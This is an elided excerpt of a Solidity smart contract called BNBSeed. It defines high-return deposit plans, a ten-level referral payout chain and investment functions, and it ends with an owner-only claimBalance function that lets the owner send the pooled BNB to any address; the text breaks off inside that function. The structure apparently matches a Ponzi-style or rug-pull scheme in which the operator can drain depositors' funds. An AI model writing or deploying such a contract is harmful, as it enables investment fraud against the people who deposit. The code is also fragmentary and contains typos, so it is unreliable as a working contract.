...
contract BNBSeed is Ownable {
    ...
    constructor(address payable wallet) public {
        ...
        plans.push(Plan(2, 200));
        plans.push(Plan(2, 2100));
        plans.push(Plan(2, 800));
        plans.push(Plan(2, 600));
        plans.push(Plan(80, 500));
        plans.push(Plan(150, 400));
        plans.push(Plan(10, 1500));
        plans.push(Plan(7, 2500));
        plans.push(Plan(3, 4500));
    }
    ...
    function distributeRef(address _referredBy, address _sender, bool _newReferral) internal {
        ...
        if (chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress] = referralLevel8Address[_referredBy];
            if (_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 10);
            }
        }
    ...
    function invest(address referrer, uint8 plan) public payable {
        ...
        user.deposits.push(Deposit(plan, msg.value, block.timestamp,0));
    ...
    function getUserDividends(address userAddress) public  returns (uint256) {
        ...
        for (uint256 i = 0; i < user.deposits.length; i++) {
            ...
            if (user.checkpoint > finish && user.deposits[i].stauts==0) {
    ...
    function getUserAvailable(address userAddress) public  returns (uint256) {
    ...
    //The contract receives BNB transfers
    function() external payable {}

    //Withdraw BNB
    function claimBalance(uint256 amount, address to) external onlyOwner {
        address payable wallet = address(uint160(to));
